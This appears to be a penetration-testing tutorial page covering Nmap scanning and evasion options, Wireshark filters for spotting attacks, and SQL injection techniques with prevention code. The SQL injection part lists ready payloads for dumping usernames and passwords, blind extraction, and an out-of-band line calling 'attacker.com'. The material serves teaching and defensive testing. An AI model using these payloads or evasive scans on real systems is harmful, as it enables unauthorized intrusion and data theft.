🔍 Nmap - Network Discovery & Security Scanning

🔎 Nmap
Network Scanner Port Discovery Service Detection

Nmap ("Network Mapper") is the industry standard for network discovery and security auditing. It's used by security professionals worldwide to discover hosts, services, and vulnerabilities on networks.

Installation

# Kali Linux / Debian / Ubuntu
sudo apt update && sudo apt install nmap

# CentOS / RHEL / Fedora
sudo yum install nmap
# or
sudo dnf install nmap

# macOS
brew install nmap

# Windows (download from nmap.org)
# https://nmap.org/download.html

# Verify installation
nmap --version

Basic Scanning Techniques

Host Discovery
# Ping sweep - discover live hosts
nmap -sn 192.168.1.0/24

# Skip host discovery (scan all hosts)
nmap -Pn 192.168.1.100

# ARP ping discovery (local network)
nmap -PR 192.168.1.0/24

# TCP SYN ping
nmap -PS22,80,443 192.168.1.100

# UDP ping
nmap -PU53,161 192.168.1.100
Port Scanning
# Scan most common 1000 ports
nmap 192.168.1.100

# Scan all 65535 ports
nmap -p- 192.168.1.100

# Scan specific ports
nmap -p 22,80,443 192.168.1.100

# Scan port range
nmap -p 1-1000 192.168.1.100

# Fast scan (top 100 ports)
nmap -F 192.168.1.100

Scan Types Explained

┌─────────────────────────────────────────────────────────────────────────────┐ │ NMAP SCAN TYPES │ ├─────────────────────────────────────────────────────────────────────────────┤ │ │ │ TCP SCAN TYPES: │ │ ┌─────────────────────────────────────────────────────────────────────┐ │ │ │ -sS (SYN Scan) - DEFAULT, Stealth, Half-open │ │ │ │ → Sends SYN, waits for SYN/ACK (open) or RST (closed) │ │ │ │ → Fast, rarely logged, requires root │ │ │ │ │ │ │ │ -sT (TCP Connect) - Full connection, No root required │ │ │ │ → Completes 3-way handshake, easily logged │ │ │ │ → Use when you don't have root privileges │ │ │ │ │ │ │ │ -sA (ACK Scan) - Firewall rule detection │ │ │ │ → Maps firewall rules, not for port discovery │ │ │ │ │ │ │ │ -sF (FIN), -sN (NULL), -sX (Xmas) - Stealth scans │ │ │ │ → Bypass some firewalls, exploits RFC behavior │ │ │ └─────────────────────────────────────────────────────────────────────┘ │ │ │ │ UDP SCAN: │ │ ┌─────────────────────────────────────────────────────────────────────┐ │ │ │ -sU (UDP Scan) - Slower, discovers UDP services │ │ │ │ → DNS (53), SNMP (161), DHCP (67/68), NTP (123) │ │ │ │ → Open: response | Closed: ICMP unreachable │ │ │ └─────────────────────────────────────────────────────────────────────┘ │ │ │ │ UDP Scan: -sU │ │ ┌────────────┐ ┌────────────┐ │ │ │ Scanner │──── UDP Packet ────▶│ Target │ │ │ │ │◀── Response ────────│ │ │ │ └────────────┘ (if open) └────────────┘ │ │ or ICMP unreachable (if closed) │ │ │ └─────────────────────────────────────────────────────────────────────────────┘

Service & Version Detection

# Service version detection
nmap -sV 192.168.1.100

# Aggressive version detection (more probes)
nmap -sV --version-intensity 5 192.168.1.100

# Light version detection (faster)
nmap -sV --version-intensity 0 192.168.1.100

# Operating System detection
nmap -O 192.168.1.100

# OS detection with aggressive guessing
nmap -O --osscan-guess 192.168.1.100

# Combined: Service + OS + Traceroute + Scripts
nmap -A 192.168.1.100

# Comprehensive scan
nmap -sS -sV -O -sC 192.168.1.100

Nmap Scripting Engine (NSE)

Default Scripts
# Run default scripts
nmap -sC 192.168.1.100

# Run specific script category
nmap --script auth 192.168.1.100
nmap --script vuln 192.168.1.100
nmap --script discovery 192.168.1.100
nmap --script brute 192.168.1.100
Specific Scripts
# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# SSH algorithms
nmap --script ssh-auth-methods 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# Vulnerability scanning
nmap --script vuln 192.168.1.100

# All HTTP scripts
nmap --script "http-*" 192.168.1.100

Output Options

# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing/tools)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats at once
nmap -oA scan_results 192.168.1.100
# Creates: scan_results.txt, .xml, .gnmap

# Verbose output
nmap -v 192.168.1.100
nmap -vv 192.168.1.100      # More verbose

# Debug output
nmap -d 192.168.1.100
nmap -dd 192.168.1.100      # More debug

Practical Examples

Real-World Nmap Workflows
# Quick network overview
nmap -sn 192.168.1.0/24 -oG - | grep "Up"

# Comprehensive web server scan
nmap -sS -sV -O -p- --script "vuln and http-*" -oA webserver_scan target.com

# Scan for specific vulnerabilities
nmap --script ssl-heartbleed,ssl-poodle -p 443 target.com

# Firewall evasion techniques
nmap -f 192.168.1.100                    # Fragment packets
nmap -D RND:10 192.168.1.100            # Decoy scan
nmap -S spoofed_ip 192.168.1.100        # Spoof source IP
nmap --source-port 53 192.168.1.100     # Source port manipulation

# Timing templates (T0-T5, T3 is default)
nmap -T0 192.168.1.100    # Paranoid (very slow)
nmap -T1 192.168.1.100    # Sneaky
nmap -T2 192.168.1.100    # Polite
nmap -T3 192.168.1.100    # Normal (default)
nmap -T4 192.168.1.100    # Aggressive
nmap -T5 192.168.1.100    # Insane (very fast)
Pro Tip: Always start with -sn to discover live hosts before scanning ports. Use -Pn when you know hosts are up but blocking ping. The -A flag combines multiple useful options for quick reconnaissance.

🦈 Wireshark - Network Protocol Analysis

🦈 Wireshark
Packet Analysis Network Forensics Protocol Debugging

Wireshark is the world's most widely used network protocol analyzer. It lets you capture and interactively browse the traffic running on a computer network, making it essential for security analysis and troubleshooting.

Installation

# Kali Linux / Debian / Ubuntu
sudo apt update && sudo apt install wireshark

# Add user to wireshark group (to capture without root)
sudo usermod -aG wireshark $USER

# CentOS / RHEL / Fedora
sudo yum install wireshark wireshark-gnome

# macOS
brew install --cask wireshark

# Windows
# Download from https://www.wireshark.org/download.html

# Verify installation
wireshark --version

# Command-line version (tshark)
sudo apt install tshark
tshark --version

Essential Display Filters

IP Address Filters
ip.addr == 192.168.1.100 Traffic to/from IP
ip.src == 192.168.1.100 Source IP only
ip.dst == 192.168.1.100 Destination IP only
ip.addr == 192.168.1.0/24 Entire subnet
Protocol Filters
tcp All TCP traffic
udp All UDP traffic
http HTTP traffic
dns DNS queries
Port Filters
tcp.port == 80 TCP port 80
tcp.port == 443 || tcp.port == 80 HTTP/HTTPS
tcp.dstport == 22 SSH connections
udp.port == 53 DNS over UDP
Advanced Filters
http.request.method == "POST" POST requests only
http contains "password" Password in HTTP
tcp.flags.syn == 1 SYN packets
frame contains "login" Any "login" string

Combining Filters

# AND operator (both conditions)
ip.addr == 192.168.1.100 && tcp.port == 80

# OR operator (either condition)
tcp.port == 80 || tcp.port == 443

# NOT operator (exclude)
!ip.addr == 192.168.1.1

# Complex filter
ip.addr == 192.168.1.100 && (tcp.port == 80 || tcp.port == 443) && http

# Filter by TCP flags
tcp.flags.syn == 1 && tcp.flags.ack == 0    # SYN only (connection start)
tcp.flags.syn == 1 && tcp.flags.ack == 1    # SYN-ACK (server response)
tcp.flags.reset == 1                         # RST packets (connection reset)
tcp.flags.fin == 1                           # FIN packets (connection end)

# HTTP specific
http.request                                 # All HTTP requests
http.response                                # All HTTP responses
http.response.code == 404                    # 404 errors
http.request.uri contains "admin"            # URLs with "admin"

Following Streams

# Right-click packet → Follow → TCP Stream
# Shows complete conversation between client and server

# Filter for specific stream
tcp.stream eq 0
tcp.stream eq 1

# View specific stream direction
tcp.stream eq 0 && ip.src == 192.168.1.100

# tshark command-line equivalent
tshark -r capture.pcap -q -z follow,tcp,ascii,0

Security Analysis Examples

Detecting Suspicious Activity
# Port scan detection - Many SYN packets to different ports
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Detect password in cleartext
frame contains "password" || frame contains "passwd" || frame contains "pass="

# SQL injection attempts in HTTP
http.request.uri contains "SELECT" || http.request.uri contains "UNION" || http.request.uri contains "' OR "

# Large data exfiltration
tcp.payload && frame.len > 1000

# Brute force attempts - Many failed logins
http.response.code == 401 || http.response.code == 403

# Detect malware communication (beaconing)
# Look for regular timing patterns in connections
dns.qry.name contains "malware" || dns.qry.name matches "\\w{10,}\\.(com|net|org)"

# SMB traffic (potential lateral movement)
tcp.port == 445 || tcp.port == 139

# Detect ARP spoofing
arp.duplicate-address-detected || arp.duplicate-address-frame

tshark - Command Line Wireshark

# Capture from interface
tshark -i eth0

# Capture with filter
tshark -i eth0 -f "port 80"

# Read pcap file
tshark -r capture.pcap

# Apply display filter
tshark -r capture.pcap -Y "http.request"

# Extract specific fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port

# Export HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects

# Statistics
tshark -r capture.pcap -q -z conv,tcp    # TCP conversations
tshark -r capture.pcap -q -z io,phs      # Protocol hierarchy

# Write to file
tshark -i eth0 -w output.pcap -c 1000    # Capture 1000 packets
Important: Capturing network traffic may capture sensitive information (passwords, cookies, personal data). Only capture traffic on networks you own or have explicit permission to analyze. Always handle captured data responsibly and delete it when no longer needed.

💉 SQL Injection Penetration Testing

💉 SQL Injection
Web Vulnerability Data Extraction Critical Severity

SQL Injection (SQLi) is one of the most critical web application vulnerabilities. It allows attackers to interfere with database queries, potentially accessing, modifying, or deleting data.

Critical: SQL Injection testing should ONLY be performed on applications you own or have explicit written permission to test. Unauthorized database access is a serious crime. Practice on legal platforms like PortSwigger Academy, HackTheBox, or your own lab environments.

Types of SQL Injection

┌─────────────────────────────────────────────────────────────────────────────┐ │ SQL INJECTION TYPES │ ├─────────────────────────────────────────────────────────────────────────────┤ │ │ │ 1. IN-BAND SQLi (Most Common) │ │ ├── Error-based: Error messages reveal database info │ │ │ Example: ' OR 1=1 -- │ │ │ │ │ └── UNION-based: Use UNION to extract data │ │ Example: ' UNION SELECT username,password FROM users-- │ │ │ │ 2. BLIND SQLi (No Visible Output) │ │ ├── Boolean-based: TRUE/FALSE conditions │ │ │ Example: ' AND 1=1-- (different response than AND 1=2--) │ │ │ │ │ └── Time-based: Response time indicates TRUE/FALSE │ │ Example: ' AND SLEEP(5)-- │ │ │ │ 3. OUT-OF-BAND SQLi (Rare) │ │ └── Data exfiltration via DNS/HTTP requests │ │ Example: '; EXEC master..xp_dirtree '//attacker.com'-- │ │ │ │ ┌─────────────────────────────────────────────────────────────────────┐ │ │ │ ATTACK FLOW │ │ │ │ │ │ │ │ [Find Injection] → [Determine Type] → [Extract Data] │ │ │ │ ↓ ↓ ↓ │ │ │ │ Test parameters Error? Union? Database, Tables, │ │ │ │ with payloads Blind? OOB? Columns, Data │ │ │ └─────────────────────────────────────────────────────────────────────┘ │ │ │ └─────────────────────────────────────────────────────────────────────────────┘

Manual SQL Injection Testing

Detection Payloads
'           # Single quote
"           # Double quote
' OR '1'='1 # Always true
' OR 1=1--  # Comment rest
' OR 1=1#   # MySQL comment
' OR 'x'='x # String comparison
1 OR 1=1    # Numeric injection
1 AND 1=1   # Test for injection
1 AND 1=2   # Should differ if vulnerable

' UNION SELECT banner FROM v$version--

' UNION SELECT sqlite_version()--

UNION-Based Injection

# Step 1: Determine number of columns
' ORDER BY 1--    # Works
' ORDER BY 5--    # Works
' ORDER BY 6--    # Error = 5 columns

# Step 2: Find injectable columns
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT NULL,'test',NULL,NULL,NULL--

# Step 3: Extract database info (MySQL)
' UNION SELECT 1,database(),user(),version(),5--

# Step 4: List tables
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()--

# Step 5: List columns
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--

# Step 6: Extract data
' UNION SELECT 1,username,password,4,5 FROM users--

Blind SQL Injection

Boolean-Based Blind
# Test if vulnerable
' AND 1=1--   # Normal response
' AND 1=2--   # Different response

# Extract database name length
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=8--

# Extract database name character by character
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))=115--
# 115 = 's'

# Extract data
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>10--
Time-Based Blind
# MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# SQL Server
' WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--

# PostgreSQL
' AND pg_sleep(5)--

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--

# Conditional time delay
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--

SQL Injection Prevention

Secure Coding Practices
# BAD - Vulnerable to SQLi
query = f"SELECT * FROM users WHERE id = {user_input}"
cursor.execute(query)

# GOOD - Parameterized queries (Prepared Statements)
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_input,))

# Python with SQLAlchemy
from sqlalchemy import text
query = text("SELECT * FROM users WHERE id = :id")
result = db.execute(query, {"id": user_input})

# PHP Prepared Statement
 $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
 $stmt->execute([$user_input]);

# Java Prepared Statement
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, user_input);

# Additional protections:
# 1. Input validation (whitelist allowed characters)
# 2. Least privilege database accounts
# 3. Web Application Firewall (WAF)
# 4. Error handling (don't expose DB errors)
# 5. Regular security audits
